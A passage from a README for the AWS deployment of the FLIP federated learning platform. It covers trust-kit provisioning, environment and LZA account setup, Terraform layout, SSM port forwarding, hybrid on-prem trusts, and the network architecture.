net's CA workspace (`fl-services/nvflare/provision/workspace-<env>/`) and mints the next
`Trust_<n>` names on **every** net via `nvflare provision --add_client` (existing kits
untouched — no CA rotation), uploads **only** the new kits additively (never
`aws s3 sync --delete`) plus a refresh of each net's mirrored `state/cert.json`, and
appends the activated + minted names to `FL_KIT_SLOT_NAMES` in the env file; the make target then
finishes with `make apply-fl-kit-slots` — a targeted plan/apply of only the
`/flip/fl_kit_slot_names` SSM parameter (plus the flip-api task-role policy that grants
its read, so the first rollout is self-contained), re-rendered from the env file. The
kit-slot list is plain configuration, so the plan diff is human-readable — the target
pauses for a confirmation after the plan prints (`YES=1` skips it), so read it before
answering. flip-api re-reads the parameter when its slot pool runs dry
(reconcile-on-miss), so the new slots are claimable by the next
`make register-trust KIT=<CODE>` with **no restart and no task-definition change**.

> **The targeted apply is not literally one resource.** `-target` applies the target's
> whole dependency closure, and the flip-api task-role policy references the bucket
> modules, whose server-access logging points at `aws_s3_bucket.flip_access_logs`. On an
> environment whose state predates that S3-logging hardening, the first
> `apply-fl-kit-slots` therefore *also* creates `flip-access-logs-<subdomain>` and its
> ACL/ownership controls. It is additive (stag, 2026-07-14: **4 to add, 1 to change, 0 to
> destroy**) and neither prod nor stag had the bucket, so expect it on the first prod
> activation too. Nothing is replaced or destroyed — but read the plan before confirming.

The script has a black-box test harness (`scripts/tests/test_add_fl_kits.sh`, `aws`/`make`/`openssl`
stubbed — no credentials or network) that CI runs via `validate_terraform.yml` on any
`deploy/providers/AWS/**` change; it also runs standalone with plain `bash`.

Kit-minting details and the manual fallback:
[`fl-services/nvflare/README.md`](../../../fl-services/nvflare/README.md#onboarding-a-new-client-onto-an-existing-network).

### Deployment to Different Environments

**Staging:**

```bash
make full-deploy PROD=stag
```

**Production:**

```bash
make full-deploy PROD=true
```

The `PROD` variable determines which environment files are loaded:

- `PROD=stag` → Uses the root `.env.stag`
- `PROD=true` → Uses the root `.env.production`
- `PROD=lza` → Uses the root `.env.lza-prod` (the LZA FLIPProduction account — see
  [Deploying to the LZA account](#deploying-to-the-lza-account-flipproduction))

If `PROD` is omitted when running the AWS provider Makefile, it defaults to staging.

The Makefile maps `PROD` onto `TF_VAR_environment` (`prod` when `PROD=true` or `PROD=lza`, otherwise `stag`). Terraform branches on this variable to gate prod-only RDS hardening — see [RDS lifecycle](#rds-lifecycle-stag-vs-prod). `PROD=lza` additionally sets the orthogonal `TF_VAR_lza_managed_network=true` platform-managed-network toggle.

#### AWS profile aliases

The Makefile guards refuse to apply unless `AWS_PROFILE` matches the expected profile for the chosen environment. Defaults are the short logical names `prod`, `stag`, and `dev` — add these aliases to `~/.aws/config` so commands like `AWS_PROFILE=stag make plan` work without thinking about account numbers:

```ini
[profile prod]
sso_session = FLIP
sso_account_id = <prod-sso-account-id>
sso_role_name = <sso-role-name>
region = <aws-region>
output = json

[profile stag]
sso_session = FLIP
sso_account_id = <stag-sso-account-id>
sso_role_name = <sso-role-name>
region = <aws-region>
output = json

[profile dev]
sso_session = FLIP
sso_account_id = <dev-sso-account-id>
sso_role_name = <sso-role-name>
region = <aws-region>
output = json
```

Replace each `<…>` with the matching value from the FLIP AWS account directory (kept out of the public repo).

If your local profile names differ, override the defaults via `PROD_AWS_PROFILE`, `STAG_AWS_PROFILE`, or `DEV_AWS_PROFILE` (in your env file or on the make command line).

**Dev account (Cognito + SES only):**

The dev AWS account runs only the services that cannot reasonably run locally (Cognito for auth, SES for email). A separate, minimal Terraform root lives in [`dev/`](./dev/README.md) and calls the same `modules/cognito` and `modules/ses` as this stack, so a change to either service lands in both environments from one place. The dev stack reuses `.env.development` — the same env file the local Docker Compose dev stack consumes — so there is no extra file to maintain.

The dev stack has its own Makefile; drive it from the `dev/` directory:

```bash
cd deploy/providers/AWS/dev
make create-backend  # one-time, if the backend bucket needs bootstrapping
make init            # one-time, or after backend config changes
make plan
make apply
```

See [`dev/README.md`](./dev/README.md) for the one-time `terraform import` workflow that pulls the manually-created dev Cognito pool into state.

### Deploying to the LZA account (FLIPProduction)

[FLIP#749](https://github.com/londonaicentre/FLIP/issues/749) migrates the production deployment to the LZA-provisioned
**FLIPProduction** account (`893493035022`, eu-west-2). Until cutover it runs **in parallel** with legacy prod: every
LZA adaptation in this stack is env-gated behind `PROD=lza`, and with `PROD=true`/`PROD=stag` the resolved
configuration is identical to before — the legacy environments are never touched by LZA work.

**What `PROD=lza` selects:**

| Concern | Value |
| --- | --- |
| Env file | root `.env.lza-prod` (gitignored, like the other env files) |
| Profile guard | `AWS_PROFILE=lza-prod` — a short local alias for the `FLIPAdminAccess` permission set on `893493035022`, per the same convention as `prod`/`stag` (override via `LZA_AWS_PROFILE`) |
| `TF_VAR_environment` | `prod` — LZA is a production estate, so all prod-only hardening (RDS deletion protection, final snapshot) stays on |
| `TF_VAR_lza_managed_network` | `true` — the platform-managed-network toggle, orthogonal to `environment` (see below) |
| Trust kit suffix | `trust/.env.<CODE>.lza-prod` — a separate namespace so legacy prod kits are never overwritten |
| `deploy-centralhub` git ref | `origin/main` (same as legacy prod) |

**Platform-managed vs FLIP-managed.** The LZA account's network is owned by the accelerator pipeline
([londonaicentre/lza](https://github.com/londonaicentre/lza)) and VPC-layer creation is SCP-denied in-account, so with
`TF_VAR_lza_managed_network=true` Terraform:

- **skips creating**: the VPC module (VPC/subnets/NAT/IGW/EIPs), the in-account VPC endpoints (interface endpoints are
  centralised in the Network account; S3+DynamoDB gateway endpoints are platform-provided), the DHCP options, and the
  `/flip/networking/*` SSM params (legacy TGW coupling — the LZA TGW attachment is platform-managed);
- **discovers instead**: the `AWSAccelerator-eu-west-2-prod` VPC and its subnets by Name tag (`network_lza.tf`;
  override the name via `LZA_VPC_NAME`). Subnet lookups match ALL `-app-*` / `-data-*` hits, so the multi-AZ `-b`
  subnets the platform team is adding appear on the next plan without a code change;
- **places by connectivity need**: RDS instances go to the isolated **data** subnets (local routes only — nothing
  there can reach TGW/endpoints, and RDS doesn't need to); ECS tasks, the internal ALB, the RDS Proxy, EFS mount
  targets and the EC2 hosts go to the TGW-routed **app** subnets (they need the central endpoints / image pulls);
- **gates off**: the SG-drift CloudTrail→EventBridge→Lambda stack (`security.tf` — the org baseline of Control Tower
  org trail, GuardDuty, Security Hub and Config covers it) and the public FL-server NLB + target group + DNS record +
  SG rules (no IGW and VPC Block Public Access make an internet-facing NLB impossible; FL ingress instead comes
  through the networking account's edge NLB over TGW — proven end-to-end in FLIP#829/PR#830, wired up for the real
  fl-server as follow-up #749 work). The `fl-server-net-1` / `fl-api-net-1` ECS services themselves still deploy —
  they just have no inbound FL path yet.

Everything else (ECS Fargate, RDS + Proxy, Cognito, S3 + CMK, Secrets Manager, SES, EFS, Cloud Map, internal ALB,
CloudFront + WAF + ACM) remains FLIP-managed exactly as on legacy prod.

**Prerequisites (already provisioned out-of-band in the account, not Terraform-managed here):**

- TF state bucket `flip-terraform-state-lza` (versioned, SSE-KMS, public access blocked). `make create-backend
  PROD=lza` is idempotent against it.
- ECR **pull-through cache rules** — the account has no internet egress, so images come from in-account mirrors over
  the central `ecr.api`/`ecr.dkr` endpoints: prefix `ghcr/` mirroring `ghcr.io` (upstream auth via a read-only GHCR
  PAT in the `ecr-pullthroughcache/ghcr` Secrets Manager secret) and the credential-less `ecr-public/` prefix
  mirroring `public.ecr.aws` (used for the EFS-provision utility image). The execution role's
  `ecr:BatchImportUpstreamImage`/`ecr:CreateRepository` grant for first-pull imports IS Terraform-managed
  (`iam_ecs.tf`, LZA-gated).
- An `lza-prod` profile in `~/.aws/config` for the account's Identity Center `FLIPAdminAccess` permission set (an
  `aws configure sso` against the account, then rename the generated profile — same short-alias convention as
  `prod`/`stag`; override the expected name via `LZA_AWS_PROFILE`).

**`.env.lza-prod`.** Carries the same keys as `.env.production` (start from that shape); the values that MUST differ,
plus the LZA-only keys:

```bash
# Terraform backend + account
FLIP_TFSTATE_BUCKET_NAME=flip-terraform-state-lza
AWS_REGION=eu-west-2

# Registry: the ghcr/ pull-through cache, NOT ghcr.io (no internet egress).
# Composes with the image names exactly like the GHCR prefix does:
# <registry><name>:<tag> → .../ghcr/londonaicentre/flip-api:<tag>
DOCKER_REGISTRY=893493035022.dkr.ecr.eu-west-2.amazonaws.com/ghcr/londonaicentre/
# EFS-provision one-shot utility image via the credential-less ecr-public/ cache
EFS_PROVISION_IMAGE=893493035022.dkr.ecr.eu-west-2.amazonaws.com/ecr-public/aws-cli/aws-cli:2.22.35

# Bucket names are globally unique and the legacy flipprod-* names stay taken
# while the old account lives — the LZA env uses its own flip-lza-* namespace.
FLIP_MODEL_FILES_UPLOADS_BUCKET_NAME=flip-lza-model-files-uploads
FLIP_FL_RESULTS_BUCKET_NAME=flip-lza-fl-results
FLIP_APP_BUNDLES_BUCKET_NAME=flip-lza-app-bundles
AICENTRE_BUCKET_NAME=flip-lza-aicentre
FLIP_UI_BUCKET_NAME=flip-lza-ui

# No Route53 hosted zone in the account yet (its move is a platform-side DNS
# line item) — first bring-up runs on the default CloudFront domain. Flip to
# true (and re-apply) once the zone lands. ALB_SUBDOMAIN/NLB_SUBDOMAIN keep
# their eventual post-cutover values meanwhile (used for resource naming).
MANAGE_DNS=false
ALB_SUBDOMAIN=app.flip.aicentre.co.uk
NLB_SUBDOMAIN=fl.app.flip.aicentre.co.uk

# Optional: only needed if the platform VPC template is renamed.
# LZA_VPC_NAME=AWSAccelerator-eu-west-2-prod
```

Secrets (`AES_KEY_BASE64`, `INTERNAL_SERVICE_KEY*`, `ADMIN_USER_PASSWORD`, …) are minted fresh for the account during
the WP3 bring-up and later replaced by the carried-over legacy **values** in the WP4 data migration (so existing trust
kits and encrypted data stay valid) — never reuse the legacy Secrets Manager secret itself.

**First bring-up without DNS (`MANAGE_DNS=false`).** The zone lookup would hard-fail in a zone-less account, so
`MANAGE_DNS=false` skips it plus every Route53 record and both DNS-validated ACM certs. Consequences, all of which
revert by flipping `MANAGE_DNS=true` + `make plan`/`apply` once the zone lands:

- CloudFront serves on its default `*.cloudfront.net` domain with the default viewer certificate (no aliases —
  CloudFront only allows the default cert when no aliases are set). `terraform output CloudfrontDistributionDomain`
  prints the URL.
- The CloudFront→ALB `/api/*` origin leg runs **plain HTTP** over the private VPC-origin ENI (an ALB HTTPS listener
  needs an ISSUED cert, and issuance needs DNS validation). Viewer traffic stays HTTPS. Accepted as a bring-up-only
  limitation — the leg never leaves the VPC-origin path.
- Bucket CORS and the Cognito sign-in hostname/callback URLs follow the CloudFront default domain automatically
  (`local.ui_origin`), so uploads, downloads and sign-in work; `make deploy-ui` must generate `window.js` with
  `CENTRAL_HUB_API_URL` pointing at the CloudFront domain.
- Trusts polling the hub would need the CloudFront domain as `CENTRAL_HUB_API_URL` — fine for WP3 smoke trusts;
  the real cutover is DNS-only and happens after the zone migrates.

**Not yet on LZA** (tracked on #749):

- The multi-AZ `-b` subnets have landed (lza#38), unblocking the ALB and the RDS subnet group — but as of 2026-08-11
  the platform TGW attachment was still AZ-a-only, which **blackholes TGW-routed traffic from the `-b` subnets**
  (central endpoints, image pulls; reported on PR#830). Until the attachment spans both AZs, workloads that need the
  TGW must stay pinned to `-a` subnets — the e2e-lza stack (FLIP#829) shows the pinning pattern.
- No FL inbound path (see the NLB gating above). The ingress architecture itself is settled and proven end-to-end
  with dummy services — internet → networking-account edge NLB → TGW → central firewall → workload NLB → ECS
  (FLIP#829 / PR#830) — but wiring the real `fl-server-net-1` behind that chain (internal NLB + target group in this
  stack, edge listener registration on the platform side) is follow-up #749 work.
- The `full-deploy*` chains, `make status`/`check_status.py`, `update_env.py` and `make destroy` are untested against
  `PROD=lza` — WP3 exercises the `init`/`plan`/`apply` (+ `deploy-centralhub`/`deploy-ui`) loop first and fixes up the
  auxiliary tooling as findings come in.

### Terraform module layout

```
deploy/providers/AWS/
├── main.tf                     # VPC, IGW, NAT, subnets, RDS, Secrets, ALB, NLB, Route53, Central Hub + Trust EC2
├── services.tf                 # Cognito + SES (delegated to modules), S3 buckets, IAM bindings
├── ecs.tf                      # ECS cluster + Fargate capacity providers
├── ecs_services.tf             # ECS Fargate services: flip-api, fl-api-net-1, fl-server-net-1
├── ecs_tasks.tf                # ECS task definitions for the Central Hub services
├── ecs_efs_provision.tf        # Bootstrapping job that seeds the EFS volumes
├── ecs_sg.tf                   # ECS task security groups (per-service)
├── efs.tf                      # EFS file systems + access points for shared FL workspace volumes
├── iam_ecs.tf                  # IAM execution + task roles for ECS Fargate tasks
├── parameter_store.tf          # SSM Parameter Store entries consumed by ECS tasks (bucket URIs, internal URL, etc.)
├── service_discovery.tf        # Cloud Map private DNS namespace (flip.local) for ECS task-to-task resolution
├── vpc_endpoints.tf            # Interface endpoints (Secrets Manager, SSM, CloudWatch Logs) + S3 gateway endpoint
├── dhcp.tf                     # VPC DHCP option set
├── locals.tf                   # Shared locals
├── cloudfront.tf               # CloudFront distribution for flip-ui + attached WAFv2 WebACL
├── certificate.tf              # ACM certificates (ALB in eu-west-2, CloudFront viewer in us-east-1)
├── modules/
│   ├── cognito/                # shared: pool, domain, client, seed users
│   ├── ses/                    # shared: sender identity, transactional templates
│   ├── secgroup/               # shared: security-group wrapper
│   ├── flip_s3_bucket/         # shared: opinionated FLIP application S3 bucket
│   └── trust_ec2/              # prod/stag only: Trust EC2 host
└── dev/                        # dev-account root (calls cognito + ses modules)
```

The Central Hub application services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) run on **ECS
Fargate**. `aws_instance.ec2_instance` is an intentional minimum-viable SSM bastion for ad-hoc
PostgreSQL and network diagnostics: it runs no application containers, has no inbound security-group
rules, and carries only the SSM managed IAM policy. The ALB's `/api/*` rule and the NLB's FL-server
listener forward to ECS Fargate `target_type=ip` target groups
(`aws_lb_target_group.ecs_flip_api`, `aws_lb_target_group.ecs_fl_server_tcp`).

The Cognito and SES resources used to live at the root of the prod/stag stack. `services.tf` and `main.tf` ship `moved` blocks that re-anchor the old root addresses onto the new `module.cognito.*` / `module.ses.*` paths, so any state still on the old layout self-heals on the next plan — no manual `terraform state mv` needed. `scripts/import-resources.sh` already targets the module addresses, so a fresh import lands in the right place too.

### Destroy Infrastructure

The destroy process preserves critical resources (Cognito, Secrets, S3) while safely removing infrastructure:

```bash
make destroy
```

**What gets destroyed:**

- Trust EC2 instance
- Central Hub SSM bastion instance
- ECS Fargate cluster, services, task definitions, and EFS file systems
- Application Load Balancer (ALB) and Network Load Balancer (NLB)
- CloudFront distribution + WAFv2 WebACL
- Cloud Map private DNS namespace
- VPC interface + gateway endpoints
- RDS database (in `stag` only — `prod` is protected, see [RDS lifecycle](#rds-lifecycle-stag-vs-prod))
- VPC, subnets, security groups, NAT gateway
- IAM roles and policies (EC2 + ECS execution/task roles)
- SSM Parameter Store entries
- Elastic IPs

**What gets preserved:**

- Cognito User Pool and users (authentication data)
- Secrets Manager secret (FLIP_API configuration)
- S3 buckets — both the application buckets and the AI Centre bucket (see [FLIP application S3 buckets](#flip-application-s3-buckets))

#### RDS lifecycle (stag vs prod)

The RDS instance behaves differently per environment, driven by `TF_VAR_environment`:

| Setting                            | `stag` (default) | `prod` (`PROD=true`)              |
| ------------------------------------ | ------------------ | ----------------------------------- |
| `skip_final_snapshot`              | `true`           | `false`                           |
| `deletion_protection`              | `false`          | `true`                            |
| `final_snapshot_identifier_prefix` | `flip-database-final` | `flip-database-final`        |

In production, `terraform destroy` (or any `make destroy` against the prod account) will refuse to delete the RDS instance until deletion protection is removed manually, and a final snapshot named `flip-database-final-<suffix>` is taken before deletion. Staging stays disposable so trees can be torn down and rebuilt without snapshot cleanup.

### Status Checking

The deployment includes a comprehensive Python-based status checker:

```bash
make status
```

This validates:

- ✅ Terraform state and outputs
- ✅ VPC, subnets, and security group configurations
- ✅ EC2 instance health (Central Hub and Trust)
- ✅ RDS database connectivity
- ✅ Secrets Manager access
- ✅ S3 bucket accessibility
- ✅ Cognito User Pool configuration
- ✅ Docker services on the Trust EC2 and ECS services on Fargate
- ✅ HTTP endpoint availability
- ✅ SSH connectivity
- ✅ CloudWatch Logs configuration

### Accessing Trust Services (XNAT, Orthanc, Swagger Docs)

The Trust EC2 is in a private subnet with no inbound ports open. All Trust web UIs and API swagger docs are reachable via AWS Systems Manager (SSM) port forwarding.

**Prerequisites** (one-time setup):

1. AWS CLI installed and configured (`aws configure sso`)
2. AWS SSM Session Manager plugin installed:

   ```bash
   curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o /tmp/session-manager-plugin.deb
   sudo dpkg -i /tmp/session-manager-plugin.deb
   ```

**Open all port forwards in one command:**

```bash
cd deploy/providers/AWS
make forward-trust
```

This prints a list of URLs you can paste into your browser:

| Service | Local URL | Purpose |
| --- | --- | --- |
| XNAT | `http://localhost:8104` | Neuroimaging platform UI |
| Orthanc | `http://localhost:8042` | DICOM server UI (basic auth: the kit file's `ORTHANC_USERNAME`/`ORTHANC_PASSWORD`) |
| trust-api swagger | `http://localhost:8020/docs` | Trust API documentation |
| imaging-api swagger | `http://localhost:8001/docs` | Imaging API documentation |
| data-access-api swagger | `http://localhost:8010/docs` | Data access API documentation |
| Grafana | `http://localhost:3000` | Observability dashboards |

Press Ctrl+C to stop all forwards. The Central Hub UI and API are accessed via the CloudFront distribution at the canonical subdomain (e.g. `https://app.flip.aicentre.co.uk`) — no port forwarding needed. The ALB is internal (private subnets, no public IP); CloudFront reaches it through a VPC origin.

## Hybrid Deployment: Adding an On-Premises Trust

To connect a local (on-premises) Trust host to the AWS Central Hub:

Recommended orchestration target (works for both `PROD=stag` and `PROD=true`):

```bash
cd deploy/providers/AWS
make full-deploy-hybrid PROD=<stag|true> [LOCAL_TRUST_IP=<public-ip>]
```

This wrapper target runs the full AWS deployment, provisions the on-prem trust host, and redeploys the Central Hub so the new secret values are loaded. `PROD` is inherited from the environment — omit `LOCAL_TRUST_IP` to auto-detect the operator machine's public IP via `curl ipify.org`.
You still need to:

1. Start the trust stack on the host: `cd ../../.. && sudo -E env PROD=<stag|true> make -C trust up-trust KIT=<CODE>` (the trust code you registered). sudo is required — the provisioned login user is deliberately not in the docker group (docker group membership is root-equivalent, see the [local provider README](../local/README.md)).
2. Verify the trust can poll the hub (check trust-api logs for successful task polling)

Or onboard the trust step by step — the trust operator provisions their own host,
and the FLIP admin opens the firewall once the operator reports their public IP:

```bash
# On the trust host (trust operator) — provision, then start the stack
# (sudo: the provisioned login user is deliberately not in the docker group)
cd deploy/providers/AWS
set -x ANSIBLE_BECOME_PASS (read -s -P 'Sudo password: ')   # fish; bash differs
make provision-local-trust KIT=<CODE>
cd ../../.. && sudo -E env PROD=<stag|true> make -C trust up-trust KIT=<CODE>

# On the FLIP side (admin), once the operator reports their host's public IP:
#   add it to LOCAL_TRUST_PUBLIC_IPS (an HCL list) in .env.stag / .env.production, e.g.
#   LOCAL_TRUST_PUBLIC_IPS=["1.2.3.4"]
cd deploy/providers/AWS
make allow-local-trust-nlb LOCAL_TRUST_IP=<public-ip>
```

`allow-local-trust-nlb` runs a normal `terraform plan`/`apply` — the IPs are real config, so later full applies stay idempotent (no `-target`, no drift).

Verify the trust can poll the hub (check trust-api logs for successful task polling).

Full details are in the [local provider README](../local/README.md).

## Troubleshooting

### Quick Diagnosis

First, run the automated status check script to identify issues:

```bash
make status
```

This will automatically diagnose:

- AWS resource health
- Network connectivity
- Application endpoint availability
- Docker container status
- System resource usage

Review the output for failed checks and follow the specific troubleshooting steps below.

### Detailed Troubleshooting Guide

For known failure modes encountered during staging/production deployment — including Terraform state
drift, ECS service errors, CloudFront cache invalidation, RDS connectivity, and SSM Session Manager
issues — see [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md). Each entry includes symptoms, root cause, and
fix.

## Architecture

### Services

The platform supports a cloud-only setup (Central Hub + Trust on AWS) or a hybrid setup (Central Hub on AWS + Trust on-premises). Trusts poll the Central Hub for tasks — all communication is outbound from the trust.

1. **flip-ui (Frontend)**: Served as static assets from an S3 bucket behind CloudFront at the canonical subdomain. See the [flip-ui on S3 + CloudFront](#flip-ui-on-s3--cloudfront) section.

2. **Central Hub application services (ECS Fargate, private subnets)**: The hub's application containers run as ECS Fargate tasks, not on EC2.
   - `flip-api` (Backend API) — fronted by the ALB on `/api/*`
   - `fl-api-net-1` (Federated Learning API for Network 1) — internal-only, reachable via Cloud Map `flip.local`
   - `fl-server-net-1` (Federated Learning Server for Network 1) — fronted by the NLB for FL client TCP traffic

3. **Central Hub SSM bastion** (`aws_instance.ec2_instance`, t3.micro, 10 GB root volume, **private subnet**): Intentional minimal host for ad-hoc `psql` and network diagnostics. It runs no application containers, has no inbound security-group rules, and is reachable only through SSM Session Manager / SSH-over-SSM.

4. **Trust EC2** (cloud model, t3.xlarge, **private subnet**): Hosts trust-related services (automatically provisioned)
   - trust-api (polls hub for tasks)
   - imaging-api
   - data-access-api
   - fl-client-net-1 (FL Client for Network 1)
   - XNAT (medical imaging platform)
   - Orthanc (DICOM server)
   - OMOP database

5. **On-Premises Trust** (hybrid model, optional): Same trust services running on a local host
   - Provisioned via [`deploy/providers/local/`](../local/README.md)
   - Polls the Central Hub over the internet via HTTPS (outbound only)

| Application Component | Runtime |
| --------------------- | ------- |
| **Central Hub (S3 + CloudFront)** | |
| FLIP UI ✅ | S3 + CloudFront (WAFv2 attached) |
| **Central Hub (ECS Fargate, private subnets)** | |
| FLIP API ✅ | Fargate task behind ALB |
| FL API ✅ | Fargate task, Cloud Map internal |
| FL Server ✅ | Fargate task behind NLB |
| **Trust Services (Docker Compose on Trust EC2, private subnet)** | |
| Trust API ✅ | Trust EC2 |
| Imaging API ✅ | Trust EC2 |
| Data Access API ✅ | Trust EC2 |
| XNAT (medical imaging) ✅ | Trust EC2 |
| Orthanc (DICOM server) ✅ | Trust EC2 |

All trust → hub traffic is **outbound from the trust** (the hub never dials the trust). Arrows
in the diagram point in the direction in which each TCP connection is *initiated*, which is also
the direction of the request flow.

```sh
                            Users (browsers)
                                  │ HTTPS:443
                                  ▼
                  ┌─────────────────────────────────────────┐
                  │  CloudFront + WAFv2 WebACL               │
                  │  - serves flip-ui from S3                │
                  │  - /api/* → ALB origin (HTTPS-only)      │
                  └─────────────────────┬───────────────────┘
                                        │ HTTPS:443 via CloudFront VPC origin
                                        │ (AWS-managed ENI in our VPC; ALB SG
                                        │  accepts only the CloudFront-VPCOrigins
                                        │  -Service-SG, so the ALB has no
                                        │  internet-reachable path)
                                        ▼
                  ┌─────────────────────────────┐    ┌──────────────────────────────┐
                  │  ALB (private subnets,       │    │  NLB (public subnets)        │
                  │       internal=true)         │    │  TCP listener on             │
                  │  eu-west-2 ACM cert          │    │  FL_SERVER_PORT               │
                  │  https-listener: default 404;│    │  SG ingress allow-listed to: │
                  │  /api/* → flip-api TG        │    │   FLIP VPC NAT public IP +   │
                  │                              │    │   local_trust_public_ips     │
                  └──────────────┬──────────────┘    └──────────────┬───────────────┘
                                 │ → ip:8000                         │ → ip:FL_SERVER_PORT
                                 ▼                                   ▼
                  ┌──────────────────────────────────────────────────────────────────┐
                  │  ECS Fargate tasks (private subnets, awsvpc)                       │
                  │    flip-api    fl-api-net-1 (Cloud Map flip.local)    fl-server-net-1│
                  │  Egress: VPC interface + S3 gateway endpoints + shared NAT Gateway   │
                  │  Shared state: EFS access points (FL workspaces); RDS (private)      │
                  └──────────────────────────────────────────────────────────────────┘

                  Both trusts below initiate outbound to the hub on two paths
                  (the hub never dials back):
                    • HTTPS:443 → CloudFront         — poll for tasks
                    • TCP:FL_SERVER_PORT → NLB        — FL client during training

                  ┌─────────────────────────────┐    ┌──────────────────────────────┐
                  │  Trust EC2 — AWS, private    │    │  On-Prem Trust — optional     │
                  │  subnet, SSM-only inbound    │    │  Local network egress         │
                  │  Egress: FLIP VPC NAT Gw     │    │  (not the FLIP VPC NAT Gw)    │
                  │                              │    │                               │
                  │  Services (Docker Compose):  │    │  Services (Docker Compose):   │
                  │    trust-api   imaging-api   │    │    trust-api   imaging-api    │
                  │    data-access-api   XNAT    │    │    data-access-api            │
                  │    Orthanc   fl-client       │    │    fl-client                  │
                  └─────────────────────────────┘    └──────────────────────────────┘
```

![AWS architecture](docs/AWS.drawio.png "AWS architecture")

### Central Hub Infrastructure

- **VPC**: Custom VPC (`10.0.0.0/16` by default) across 2 AZs, with public + private subnets and a single shared NAT Gateway
- **ECS Fargate cluster**: Runs the Central Hub application services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) as awsvpc tasks in **private subnets**. Task definitions, services, and per-service security groups live in `ecs*.tf` and `iam_ecs.tf`.
- **Central Hub SSM bastion**: t3.micro instance with a 10 GB root volume in a **private subnet**. It carries only the SSM managed IAM policy and a PostgreSQL client for ad-hoc RDS operations; application workloads run on ECS Fargate.
- **Trust EC2**: Separate t3.xlarge instance in a **private subnet**, running Trust services via Docker Compose
  - Deployed using custom Terraform module (`modules/trust_ec2`)
  - Automatic Docker and Docker Compose installation via user_data
  - Automatic Docker network creation for inter-service communication
  - No inbound ports open — access via SSM (`ssh flip-trust`) and SSM port forwarding for XNAT/Orthanc debugging (`make forward-trust`)
- **ALB (Application Load Balancer)**: HTTPS-only entrypoint for API traffic. **Internal** (`internal = true`), lives in the **private subnets** — it has no public IP and no internet-facing path. CloudFront reaches it via an `aws_cloudfront_vpc_origin` (AWS-managed ENI in this VPC). The ALB security group accepts HTTPS:443 only from the AWS-managed `CloudFront-VPCOrigins-Service-SG` (Option 2 in the AWS VPC origins docs — the documented most-restrictive pattern; a `vpc_cidr` rule would not work because AWS evaluates VPC-origin SG checks against the service-managed SG, not the ENI source IP). The `https-listener` returns 404 by default and routes `/api/*` to the `ecs-flip-api` target group (`target_type=ip`, port 8000). The legacy `http-redirect` listener on port 80 exists as a belt-and-braces fallback only — its SG has no port-80 ingress, so it is unreachable externally.
- **NLB (Network Load Balancer)**: TCP pass-through entrypoint for FL server traffic. Lives in the **public subnets**. Listens on `FL_SERVER_PORT` and forwards to the `ecs-fl-server-tcp` target group (`target_type=ip`) so the `fl-server-net-1` Fargate task receives the connection. The NLB security group ingress is allow-listed: NAT Gateway public IP (so the AWS-resident Trust EC2 can reach the FL server) plus every IP in `local_trust_public_ips` (an HCL list, set via `LOCAL_TRUST_PUBLIC_IPS` in the env file — so each on-prem trust can reach it). HTTP/2 gRPC framing is opaque to the NLB and forwarded as-is. **Why an NLB and not the ALB?** NVFLARE FL traffic is end-to-end mutual-TLS over gRPC, and an ALB (Layer 7) terminates TLS, which breaks NVFLARE's own certificate handshake. An NLB (Layer 4) does raw TCP pass-through, so the FL client and FL server complete their mTLS handshake untouched.
- **CloudFront + WAFv2**: Edge distribution that serves the `flip-ui` static site from S3 and forwards `/api/*` to the internal ALB via an `aws_cloudfront_vpc_origin` (HTTPS-only). A WAFv2 WebACL is attached to the distribution for L7 protection; WAF logs are shipped to CloudWatch Logs.
- **ACM**: Two certificates — one in `eu-west-2` for the ALB, one in `us-east-1` for the CloudFront viewer.
- **Route53**: `A` alias records for the canonical subdomain (→ CloudFront) and for the FL-server NLB.
- **EFS**: Shared file systems and access points used by the FL services for workspace volumes (configs, certs, transfer dir). Mount targets live in the **private subnets**.
- **Cloud Map (Service Discovery)**: Private DNS namespace `flip.local` used for ECS task-to-task resolution (e.g. `fl-api-net-1.flip.local`).
- **VPC endpoints**: Interface endpoints (Secrets Manager, SSM, CloudWatch Logs, ECR API + DKR) in the **private subnets** plus an S3 gateway endpoint. Allow Fargate tasks to reach AWS APIs without traversing the NAT Gateway.
- **RDS**: PostgreSQL 17 managed database (Terraform default, see `var.postgres_version`), in the **private subnets**. Subnet group + security group ingress restricted to the Central Hub bastion SG and the `flip-api` ECS task SG.
- **CloudWatch**: Logging and monitoring for ECS tasks, the Trust EC2, the WAFv2 ACL, and VPC endpoints. The minimal Central Hub bastion does not run the CloudWatch agent.
- **Secrets Manager**: Secure storage for API secrets and database credentials (`FLIP_API` secret).
- **SSM Parameter Store**: Configuration values read by ECS tasks at startup — bucket URIs, internal service URL, internal-service-key header name.
- **S3 Backend**: Remote state storage with environment-specific buckets, using S3 native locking (`use_lockfile = true` in `backend.tf`; no DynamoDB lock table).

### Subnet placement at a glance

| Resource | Subnet | Notes |
| --- | --- | --- |
| Internet Gateway | (attached to VPC) | Route target for public subnets |
| NAT Gateway | **Public** | Single shared NAT for all private-subnet egress |
| ALB | **Private** (`internal = true`) | Reached only via the CloudFront VPC origin ENI; SG accepts 443 only from `CloudFront-VPCOrigins-Service-SG` |
| NLB | **Public** | Security group ingress allow-listed to NAT public IP + on-prem Trust IP |
| Central Hub SSM bastion (`aws_instance.ec2_instance`) | **Private** | t3.micro, 10 GB; no inbound rules or app workloads; `psql` + SSM only |
| Trust EC2 (`module.trust_ec2`) | **Private** | No inbound ports; SSM-only |
| ECS Fargate tasks (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) | **Private** | `assign_public_ip = false`, awsvpc ENIs |
| RDS (PostgreSQL) | **Private** | DB subnet group spans both private subnets |
| EFS mount targets | **Private** | One per AZ |
| VPC interface endpoints (Secrets Manager, SSM, Logs, ECR API/DKR) | **Private** | One ENI per AZ |
| S3 gateway endpoint | (routes attached to private route tables) | No ENI |

### Trust Infrastructure

Trust services can run on AWS EC2 or on-premises. Both models use the same Docker Compose stack. Trusts poll the Central Hub for tasks — all communication is outbound from the trust.

**Cloud Trust (AWS EC2)** — deployed using the `trust_ec2` Terraform module:

- Automated Docker and Docker Compose installation
- Trust compose stack deployment via user_data script
- Automatic Docker network creation for inter-service communication
- Runs in a private subnet with no inbound ports — XNAT and Orthanc accessible only via SSM port forwarding for debugging

**On-Premises Trust** — provisioned via `make provision-local-trust` and the Ansible playbook in [`deploy/providers/local/`](../local/README.md):

